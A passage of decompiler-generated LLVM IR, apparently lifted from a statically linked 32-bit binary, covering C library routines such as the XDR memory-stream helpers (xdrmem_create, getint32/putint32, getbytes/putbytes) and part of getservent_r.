  %v1_8063eb3 = icmp eq i32 %v0_8063eb3, 0
  br i1 %v1_8063eb3, label %dec_label_pc_8063ed5, label %dec_label_pc_8063eb7

dec_label_pc_8063eb7:                             ; preds = %dec_label_pc_8063eb3
  %v2_8063ebb = call i32 @free(i32 %v0_8063eb3)
  %v0_8063ec0 = load i32, i32* @ebp, align 4
  %v1_8063ec0 = inttoptr i32 %v0_8063ec0 to i32*
  store i32 0, i32* %v1_8063ec0, align 4
  br label %dec_label_pc_8063ecc

dec_label_pc_8063ecc:                             ; preds = %dec_label_pc_8063e85, %dec_label_pc_8063eb7
  %storemerge = phi i32 [ 1, %dec_label_pc_8063eb7 ], [ 0, %dec_label_pc_8063e85 ]
  br label %dec_label_pc_8063eda

dec_label_pc_8063ed1:                             ; preds = %dec_label_pc_8063e61, %dec_label_pc_8063e53, %entry
  br label %dec_label_pc_8063eda

dec_label_pc_8063ed5:                             ; preds = %dec_label_pc_8063eb3, %dec_label_pc_8063e68
  br label %dec_label_pc_8063eda

dec_label_pc_8063eda:                             ; preds = %dec_label_pc_8063ed1, %dec_label_pc_8063ecc, %dec_label_pc_8063ed5
  %v0_8063ee1 = phi i32 [ 0, %dec_label_pc_8063ed1 ], [ %storemerge, %dec_label_pc_8063ecc ], [ 1, %dec_label_pc_8063ed5 ]
  store i32 %v0_8063e1d, i32* %esi.global-to-local, align 4
  store i32 %v0_8063e1c, i32* @edi, align 4
  store i32 %v0_8063e1b, i32* @ebp, align 4
  ret i32 %v0_8063ee1

; uselistorder directives
  uselistorder i32 %v2_8063e74, { 0, 2, 1 }
  uselistorder i32 %v2_8063e58.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8063e58.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8063e4b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8063e1d, { 1, 0 }
  uselistorder i32 %v0_8063e1c, { 1, 0 }
  uselistorder i32 %v0_8063e1b, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @xdr_opaque, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8063eda, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063ecc, { 1, 0 }
  uselistorder label %dec_label_pc_8063eb3, { 1, 0 }
  uselistorder label %dec_label_pc_8063e58, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8063eef = add i32 %arg2, 4
  %v4_8063ef7 = inttoptr i32 %arg1 to i32*
  %v5_8063ef7 = call i32 @xdr_bytes(i32* %v4_8063ef7, i32 %v1_8063eef, i32 %arg2, i32 1024)
  ret i32 %v5_8063ef7
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %edx.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v2_8063f0c = add i32 %tmp4, 16
  %v3_8063f0c = inttoptr i32 %v2_8063f0c to i32*
  store i32 %arg2, i32* %v3_8063f0c, align 4
  %v0_8063f0f = load i32, i32* %eax.global-to-local, align 4
  %v1_8063f0f = load i32, i32* %edx.global-to-local, align 4
  %v2_8063f0f = inttoptr i32 %v1_8063f0f to i32*
  store i32 %v0_8063f0f, i32* %v2_8063f0f, align 4
  %v0_8063f11 = load i32, i32* %edx.global-to-local, align 4
  %v1_8063f11 = add i32 %v0_8063f11, 4
  %v2_8063f11 = inttoptr i32 %v1_8063f11 to i32*
  store i32 ptrtoint (i32* @global_var_806e280.811 to i32), i32* %v2_8063f11, align 4
  %v0_8063f18 = load i32, i32* @ecx, align 4
  %v1_8063f18 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063f18 = add i32 %v1_8063f18, 12
  %v3_8063f18 = inttoptr i32 %v2_8063f18 to i32*
  store i32 %v0_8063f18, i32* %v3_8063f18, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_8063f1f = load i32, i32* %edx.global-to-local, align 4
  %v2_8063f1f = add i32 %v1_8063f1f, 20
  %v3_8063f1f = inttoptr i32 %v2_8063f1f to i32*
  store i32 %arg3, i32* %v3_8063f1f, align 4
  ret i32 %arg3

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_8063f23 = load i32, i32* @eax, align 4
  ret i32 %v0_8063f23
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8063f28 = add i32 %arg1, 12
  %v2_8063f28 = inttoptr i32 %v1_8063f28 to i32*
  %v3_8063f28 = load i32, i32* %v2_8063f28, align 4
  %v2_8063f2b = add i32 %arg1, 16
  %v3_8063f2b = inttoptr i32 %v2_8063f2b to i32*
  %v4_8063f2b = load i32, i32* %v3_8063f2b, align 4
  %v5_8063f2b = sub i32 %v3_8063f28, %v4_8063f2b
  ret i32 %v5_8063f2b
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8063f2f = load i32, i32* @ebx, align 4
  store i32 %v0_8063f2f, i32* %stack_var_-4, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8063f3a = add i32 %arg1, 20
  %v2_8063f3a = inttoptr i32 %v1_8063f3a to i32*
  %v3_8063f3a = load i32, i32* %v2_8063f3a, align 4
  store i32 %v3_8063f3a, i32* %eax.global-to-local, align 4
  %v2_8063f3d = add i32 %arg1, 16
  %v3_8063f3d = inttoptr i32 %v2_8063f3d to i32*
  %v4_8063f3d = load i32, i32* %v3_8063f3d, align 4
  %v5_8063f3d = add i32 %v4_8063f3d, %arg2
  %v2_8063f40 = add i32 %arg1, 12
  %v3_8063f40 = inttoptr i32 %v2_8063f40 to i32*
  %v4_8063f40 = load i32, i32* %v3_8063f40, align 4
  %v5_8063f40 = add i32 %v4_8063f40, %v3_8063f3a
  store i32 %v5_8063f40, i32* %eax.global-to-local, align 4
  %v8_8063f45 = icmp slt i32 %v5_8063f40, %v5_8063f3d
  br i1 %v8_8063f45, label %dec_label_pc_8063f51, label %dec_label_pc_8063f47

dec_label_pc_8063f47:                             ; preds = %entry
  %v2_8063f47 = sub i32 %v5_8063f40, %v5_8063f3d
  store i32 %v2_8063f47, i32* %eax.global-to-local, align 4
  store i32 %v5_8063f3d, i32* %v3_8063f40, align 4
  %v0_8063f4c = load i32, i32* %eax.global-to-local, align 4
  %v1_8063f4c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8063f4c = add i32 %v1_8063f4c, 20
  %v3_8063f4c = inttoptr i32 %v2_8063f4c to i32*
  store i32 %v0_8063f4c, i32* %v3_8063f4c, align 4
  %v0_8063f4f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063f4f = and i32 %v0_8063f4f, -256
  %v2_8063f4f = or i32 %v1_8063f4f, 1
  store i32 %v2_8063f4f, i32* %ebx.global-to-local, align 4
  %v2_8063f53.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8063f51

dec_label_pc_8063f51:                             ; preds = %entry, %dec_label_pc_8063f47
  %v2_8063f53 = phi i32 [ %v0_8063f2f, %entry ], [ %v2_8063f53.pre, %dec_label_pc_8063f47 ]
  %v0_8063f51 = phi i32 [ 0, %entry ], [ %v2_8063f4f, %dec_label_pc_8063f47 ]
  store i32 %v0_8063f51, i32* %eax.global-to-local, align 4
  store i32 %v2_8063f53, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8063f51

; uselistorder directives
  uselistorder i32 %v0_8063f51, { 1, 0 }
  uselistorder i32 %v5_8063f40, { 1, 0, 2 }
  uselistorder i32 %v5_8063f3d, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8063f51, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8063f55 = load i32, i32* @ebx, align 4
  store i32 %v0_8063f55, i32* %stack_var_-4, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8063f60 = add i32 %arg1, 20
  %v2_8063f60 = inttoptr i32 %v1_8063f60 to i32*
  %v3_8063f60 = load i32, i32* %v2_8063f60, align 4
  %v7_8063f63 = icmp ult i32 %v3_8063f60, %arg2
  br i1 %v7_8063f63, label %dec_label_pc_8063f75, label %dec_label_pc_8063f67

dec_label_pc_8063f67:                             ; preds = %entry
  %v2_8063f63 = sub i32 %v3_8063f60, %arg2
  %v1_8063f67 = add i32 %arg1, 12
  %v2_8063f67 = inttoptr i32 %v1_8063f67 to i32*
  %v3_8063f67 = load i32, i32* %v2_8063f67, align 4
  store i32 %v3_8063f67, i32* %edx.global-to-local, align 4
  store i32 %v2_8063f63, i32* %v2_8063f60, align 4
  %v0_8063f6f = load i32, i32* %edx.global-to-local, align 4
  %v1_8063f6f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8063f6f = add i32 %v1_8063f6f, %v0_8063f6f
  %v1_8063f72 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8063f72 = add i32 %v1_8063f72, 12
  %v3_8063f72 = inttoptr i32 %v2_8063f72 to i32*
  store i32 %v2_8063f6f, i32* %v3_8063f72, align 4
  %v0_8063f75.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_8063f77.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8063f75

dec_label_pc_8063f75:                             ; preds = %entry, %dec_label_pc_8063f67
  %v2_8063f77 = phi i32 [ %v0_8063f55, %entry ], [ %v2_8063f77.pre, %dec_label_pc_8063f67 ]
  %v0_8063f75 = phi i32 [ 0, %entry ], [ %v0_8063f75.pre, %dec_label_pc_8063f67 ]
  store i32 %v2_8063f77, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8063f75

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063f75, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8063f7f = add i32 %arg1, 20
  %v2_8063f7f = inttoptr i32 %v1_8063f7f to i32*
  %v3_8063f7f = load i32, i32* %v2_8063f7f, align 4
  %tmp4 = icmp ult i32 %v3_8063f7f, 4
  br i1 %tmp4, label %dec_label_pc_8063fa3, label %dec_label_pc_8063f87

dec_label_pc_8063f87:                             ; preds = %entry
  %v1_8063f87 = add i32 %v3_8063f7f, -4
  %v1_8063f8a = add i32 %arg1, 12
  %v2_8063f8a = inttoptr i32 %v1_8063f8a to i32*
  %v3_8063f8a = load i32, i32* %v2_8063f8a, align 4
  store i32 %v3_8063f8a, i32* %edx.global-to-local, align 4
  store i32 %v1_8063f87, i32* %v2_8063f7f, align 4
  %v2_8063f94 = load i32, i32* %arg2, align 4
  %v1_8063f96 = call i32 @llvm.bswap.i32(i32 %v2_8063f94)
  %v1_8063f98 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063f98 = inttoptr i32 %v1_8063f98 to i32*
  store i32 %v1_8063f96, i32* %v2_8063f98, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8063f9f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063f9f = add i32 %v0_8063f9f, 12
  %v2_8063f9f = inttoptr i32 %v1_8063f9f to i32*
  %v3_8063f9f = load i32, i32* %v2_8063f9f, align 4
  %v4_8063f9f = add i32 %v3_8063f9f, 4
  store i32 %v4_8063f9f, i32* %v2_8063f9f, align 4
  %v0_8063fa3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063fa3

dec_label_pc_8063fa3:                             ; preds = %entry, %dec_label_pc_8063f87
  %v0_8063fa3 = phi i32 [ 0, %entry ], [ %v0_8063fa3.pre, %dec_label_pc_8063f87 ]
  ret i32 %v0_8063fa3

; uselistorder directives
  uselistorder i32 %v3_8063f7f, { 1, 0 }
  uselistorder label %dec_label_pc_8063fa3, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8063fac = add i32 %arg1, 20
  %v2_8063fac = inttoptr i32 %v1_8063fac to i32*
  %v3_8063fac = load i32, i32* %v2_8063fac, align 4
  %tmp4 = icmp ult i32 %v3_8063fac, 4
  br i1 %tmp4, label %dec_label_pc_8063fd0, label %dec_label_pc_8063fb4

dec_label_pc_8063fb4:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_8063fb4 = add i32 %v3_8063fac, -4
  store i32 %v1_8063fb4, i32* %v2_8063fac, align 4
  %v0_8063fba = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063fba = add i32 %v0_8063fba, 12
  %v2_8063fba = inttoptr i32 %v1_8063fba to i32*
  %v3_8063fba = load i32, i32* %v2_8063fba, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_8063fc1 = inttoptr i32 %v3_8063fba to i32*
  %v2_8063fc1 = load i32, i32* %v1_8063fc1, align 4
  %v1_8063fc3 = call i32 @llvm.bswap.i32(i32 %v2_8063fc1)
  store i32 %v1_8063fc3, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8063fcc = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063fcc = add i32 %v0_8063fcc, 12
  %v2_8063fcc = inttoptr i32 %v1_8063fcc to i32*
  %v3_8063fcc = load i32, i32* %v2_8063fcc, align 4
  %v4_8063fcc = add i32 %v3_8063fcc, 4
  store i32 %v4_8063fcc, i32* %v2_8063fcc, align 4
  %v0_8063fd0.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063fd0

dec_label_pc_8063fd0:                             ; preds = %entry, %dec_label_pc_8063fb4
  %v0_8063fd0 = phi i32 [ 0, %entry ], [ %v0_8063fd0.pre, %dec_label_pc_8063fb4 ]
  ret i32 %v0_8063fd0

; uselistorder directives
  uselistorder i32 %v3_8063fac, { 1, 0 }
  uselistorder label %dec_label_pc_8063fd0, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8063fd9 = add i32 %arg1, 20
  %v2_8063fd9 = inttoptr i32 %v1_8063fd9 to i32*
  %v3_8063fd9 = load i32, i32* %v2_8063fd9, align 4
  %tmp4 = icmp ult i32 %v3_8063fd9, 4
  br i1 %tmp4, label %dec_label_pc_8063ffd, label %dec_label_pc_8063fe1

dec_label_pc_8063fe1:                             ; preds = %entry
  %v1_8063fe1 = add i32 %v3_8063fd9, -4
  %v1_8063fe4 = add i32 %arg1, 12
  %v2_8063fe4 = inttoptr i32 %v1_8063fe4 to i32*
  %v3_8063fe4 = load i32, i32* %v2_8063fe4, align 4
  store i32 %v3_8063fe4, i32* %edx.global-to-local, align 4
  store i32 %v1_8063fe1, i32* %v2_8063fd9, align 4
  %v2_8063fee = load i32, i32* %arg2, align 4
  %v1_8063ff0 = call i32 @llvm.bswap.i32(i32 %v2_8063fee)
  %v1_8063ff2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063ff2 = inttoptr i32 %v1_8063ff2 to i32*
  store i32 %v1_8063ff0, i32* %v2_8063ff2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8063ff9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063ff9 = add i32 %v0_8063ff9, 12
  %v2_8063ff9 = inttoptr i32 %v1_8063ff9 to i32*
  %v3_8063ff9 = load i32, i32* %v2_8063ff9, align 4
  %v4_8063ff9 = add i32 %v3_8063ff9, 4
  store i32 %v4_8063ff9, i32* %v2_8063ff9, align 4
  %v0_8063ffd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063ffd

dec_label_pc_8063ffd:                             ; preds = %entry, %dec_label_pc_8063fe1
  %v0_8063ffd = phi i32 [ 0, %entry ], [ %v0_8063ffd.pre, %dec_label_pc_8063fe1 ]
  ret i32 %v0_8063ffd

; uselistorder directives
  uselistorder i32 %v3_8063fd9, { 1, 0 }
  uselistorder label %dec_label_pc_8063ffd, { 1, 0 }
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064006 = add i32 %arg1, 20
  %v2_8064006 = inttoptr i32 %v1_8064006 to i32*
  %v3_8064006 = load i32, i32* %v2_8064006, align 4
  %tmp4 = icmp ult i32 %v3_8064006, 4
  br i1 %tmp4, label %dec_label_pc_806402a, label %dec_label_pc_806400e

dec_label_pc_806400e:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_806400e = add i32 %v3_8064006, -4
  store i32 %v1_806400e, i32* %v2_8064006, align 4
  %v0_8064014 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064014 = add i32 %v0_8064014, 12
  %v2_8064014 = inttoptr i32 %v1_8064014 to i32*
  %v3_8064014 = load i32, i32* %v2_8064014, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_806401b = inttoptr i32 %v3_8064014 to i32*
  %v2_806401b = load i32, i32* %v1_806401b, align 4
  %v1_806401d = call i32 @llvm.bswap.i32(i32 %v2_806401b)
  store i32 %v1_806401d, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8064026 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8064026 = add i32 %v0_8064026, 12
  %v2_8064026 = inttoptr i32 %v1_8064026 to i32*
  %v3_8064026 = load i32, i32* %v2_8064026, align 4
  %v4_8064026 = add i32 %v3_8064026, 4
  store i32 %v4_8064026, i32* %v2_8064026, align 4
  %v0_806402a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806402a

dec_label_pc_806402a:                             ; preds = %entry, %dec_label_pc_806400e
  %v0_806402a = phi i32 [ 0, %entry ], [ %v0_806402a.pre, %dec_label_pc_806400e ]
  ret i32 %v0_806402a

; uselistorder directives
  uselistorder i32 %v3_8064006, { 1, 0 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 5, 16, 18, 19, 17 }
  uselistorder label %dec_label_pc_806402a, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_806403c = add i32 %arg1, 20
  %v2_806403c = inttoptr i32 %v1_806403c to i32*
  %v3_806403c = load i32, i32* %v2_806403c, align 4
  %v7_806403f = icmp ult i32 %v3_806403c, %arg3
  br i1 %v7_806403f, label %dec_label_pc_8064061, label %dec_label_pc_8064043

dec_label_pc_8064043:                             ; preds = %entry
  %v2_806403f = sub i32 %v3_806403c, %arg3
  store i32 %v2_806403f, i32* %v2_806403c, align 4
  %v0_8064049 = load i32, i32* @esi, align 4
  %v0_806404e = load i32, i32* %ebx.global-to-local, align 4
  %v1_806404e = add i32 %v0_806404e, 12
  %v2_806404e = inttoptr i32 %v1_806404e to i32*
  %v3_806404e = load i32, i32* %v2_806404e, align 4
  %v3_8064051 = inttoptr i32 %v3_806404e to i16*
  %v4_8064051 = call i32 @memcpy(i16* %v3_8064051, i32 %arg2, i32 %v0_8064049)
  %v1_8064056 = add i32 %v0_806404e, 12
  %v2_8064056 = inttoptr i32 %v1_8064056 to i32*
  %v3_8064056 = load i32, i32* %v2_8064056, align 4
  %v4_8064056 = load i32, i32* @esi, align 4
  %v5_8064056 = add i32 %v4_8064056, %v3_8064056
  store i32 %v5_8064056, i32* %v2_8064056, align 4
  br label %dec_label_pc_8064061

dec_label_pc_8064061:                             ; preds = %entry, %dec_label_pc_8064043
  %v0_8064064 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8064043 ]
  ret i32 %v0_8064064

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064061, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8064074 = add i32 %arg1, 20
  %v2_8064074 = inttoptr i32 %v1_8064074 to i32*
  %v3_8064074 = load i32, i32* %v2_8064074, align 4
  %v7_8064077 = icmp ult i32 %v3_8064074, %arg3
  br i1 %v7_8064077, label %dec_label_pc_8064099, label %dec_label_pc_806407b

dec_label_pc_806407b:                             ; preds = %entry
  %v2_8064077 = sub i32 %v3_8064074, %arg3
  store i32 %v2_8064077, i32* %v2_8064074, align 4
  %v0_8064081 = load i32, i32* @esi, align 4
  %v0_8064082 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064082 = add i32 %v0_8064082, 12
  %v2_8064082 = inttoptr i32 %v1_8064082 to i32*
  %v3_8064082 = load i32, i32* %v2_8064082, align 4
  %v3_8064089 = inttoptr i32 %arg2 to i16*
  %v4_8064089 = call i32 @memcpy(i16* %v3_8064089, i32 %v3_8064082, i32 %v0_8064081)
  %v1_806408e = add i32 %v0_8064082, 12
  %v2_806408e = inttoptr i32 %v1_806408e to i32*
  %v3_806408e = load i32, i32* %v2_806408e, align 4
  %v4_806408e = load i32, i32* @esi, align 4
  %v5_806408e = add i32 %v4_806408e, %v3_806408e
  store i32 %v5_806408e, i32* %v2_806408e, align 4
  br label %dec_label_pc_8064099

dec_label_pc_8064099:                             ; preds = %entry, %dec_label_pc_806407b
  %v0_806409c = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_806407b ]
  ret i32 %v0_806409c

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064099, { 1, 0 }
}

define i32 @__initbuf() local_unnamed_addr {
entry:
  %v0_80640a3 = load i32, i32* @global_var_807d260.812, align 32
  %v1_80640a3 = icmp eq i32 %v0_80640a3, 0
  %v1_80640aa = icmp eq i1 %v1_80640a3, false
  br i1 %v1_80640aa, label %entry.dec_label_pc_80640ca_crit_edge, label %dec_label_pc_80640ac

entry.dec_label_pc_80640ca_crit_edge:             ; preds = %entry
  %v0_80640cd.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80640ca

dec_label_pc_80640ac:                             ; preds = %entry
  %v1_80640b4 = call i32 @malloc(i32 4237)
  store i32 %v1_80640b4, i32* @global_var_807d260.812, align 32
  %v1_80640c1 = icmp eq i32 %v1_80640b4, 0
  %v1_80640c3 = icmp eq i1 %v1_80640c1, false
  br i1 %v1_80640c3, label %dec_label_pc_80640ca, label %dec_label_pc_80640c5

dec_label_pc_80640c5:                             ; preds = %dec_label_pc_80640ac
  %v0_80640c5 = call i32 @abort()
  br label %dec_label_pc_80640ca

dec_label_pc_80640ca:                             ; preds = %entry.dec_label_pc_80640ca_crit_edge, %dec_label_pc_80640ac, %dec_label_pc_80640c5
  %v0_80640cd = phi i32 [ %v1_80640b4, %dec_label_pc_80640ac ], [ %v0_80640cd.pre, %entry.dec_label_pc_80640ca_crit_edge ], [ %v0_80640c5, %dec_label_pc_80640c5 ]
  ret i32 %v0_80640cd

; uselistorder directives
  uselistorder i32 %v1_80640b4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80640ca, { 2, 1, 0 }
}

define i32 @getservent_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80640ce = load i32, i32* @ebp, align 4
  %v0_80640cf = load i32, i32* @edi, align 4
  %v0_80640d0 = load i32, i32* @esi, align 4
  %v0_80640d1 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %tmp15, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_80640eb = inttoptr i32 %arg4 to i32*
  store i32 0, i32* %v1_80640eb, align 4
  %v6_80640f1 = icmp ugt i32 %arg3, 139
  br i1 %v6_80640f1, label %dec_label_pc_8064108, label %dec_label_pc_80640f3

dec_label_pc_80640f3:                             ; preds = %entry
  %v1_80640f3 = call i32 @__errno_location(i32 %v0_80640d1)
  store i32 %v1_80640f3, i32* %eax.global-to-local, align 4
  store i32 34, i32* @ebx, align 4
  %v1_80640fd = inttoptr i32 %v1_80640f3 to i32*
  store i32 34, i32* %v1_80640fd, align 4
  br label %dec_label_pc_8064294

dec_label_pc_8064108:                             ; preds = %entry
  %v2_8064113 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8064113, i32* %eax.global-to-local, align 4
  store i32 %v2_8064113, i32* %stack_var_-60, align 4
  %v4_8064118 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  store i32 %v4_8064118, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074884.813 to i32), i32* %stack_var_-60, align 4
  %v1_8064124 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v0_8064129 = load i32, i32* @ebp, align 4
  %v1_8064129 = add i32 %v0_8064129, 140
  %v0_8064133 = load i32, i32* @ebx, align 4
  %v1_8064133 = add i32 %v0_8064133, -140
  store i32 %v1_8064133, i32* @eax, align 4
  %v6_8064141 = icmp ugt i32 %v1_8064133, 4096
  br i1 %v6_8064141, label %dec_label_pc_8064158, label %dec_label_pc_8064143

dec_label_pc_8064143:                             ; preds = %dec_label_pc_8064108
  %v1_8064143 = call i32 @__errno_location(i32 %v1_8064129)
  store i32 %v1_8064143, i32* %eax.global-to-local, align 4
  store i32 34, i32* @ebx, align 4
  %v1_806414d = inttoptr i32 %v1_8064143 to i32*
  store i32 34, i32* %v1_806414d, align 4
  br label %dec_label_pc_8064283

dec_label_pc_8064158:                             ; preds = %dec_label_pc_8064108
  %v0_8064158 = load i32, i32* @global_var_807d264.814, align 4
  %v1_8064158 = icmp eq i32 %v0_8064158, 0
  %v1_806415f = icmp eq i1 %v1_8064158, false
  br i1 %v1_806415f, label %dec_label_pc_8064193.preheader, label %dec_label_pc_8064161

dec_label_pc_8064161:                             ; preds = %dec_label_pc_8064158
  store i32 ptrtoint ([14 x i8]* @global_var_806e2a8.816 to i32), i32* %stack_var_-60, align 4
  %v2_806416d = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_806e2a8.816 to i32), i32 ptrtoint (i32* @global_var_806e2f1.815 to i32))
  store i32 %v2_806416d, i32* %eax.global-to-local, align 4
  store i32 %v2_806416d, i32* @global_var_807d264.814, align 4
  %v1_806417a = icmp eq i32 %v2_806416d, 0
  %v1_806417c = icmp eq i1 %v1_806417a, false
  br i1 %v1_806417c, label %dec_label_pc_8064193.preheader, label %dec_label_pc_806417e

dec_label_pc_8064193.preheader:                   ; preds = %dec_label_pc_8064158, %dec_label_pc_8064161
  %v0_8064194.ph = phi i32 [ %v2_806416d, %dec_label_pc_8064161 ], [ %v0_8064158, %dec_label_pc_8064158 ]
  store i32 %v1_8064129, i32* %stack_var_-60, align 4
  %v3_80641a336 = call i32 @fgets(i32 %v1_8064129, i32 4096, i32 %v0_8064194.ph)
  store i32 %v3_80641a336, i32* %eax.global-to-local, align 4
  store i32 %v3_80641a336, i32* @ebx, align 4
  %v1_80641ad37 = icmp eq i32 %v3_80641a336, 0
  br i1 %v1_80641ad37, label %dec_label_pc_806417e, label %dec_label_pc_80641b1

dec_label_pc_806417e:                             ; preds = %dec_label_pc_8064193.preheader, %dec_label_pc_8064193.backedge, %dec_label_pc_8064161
  %v0_806417e = load i32, i32* %stack_var_-60, align 4
  %v1_806417e = call i32 @__errno_location(i32 %v0_806417e)
  store i32 %v1_806417e, i32* %eax.global-to-local, align 4
  store i32 5, i32* @ebx, align 4
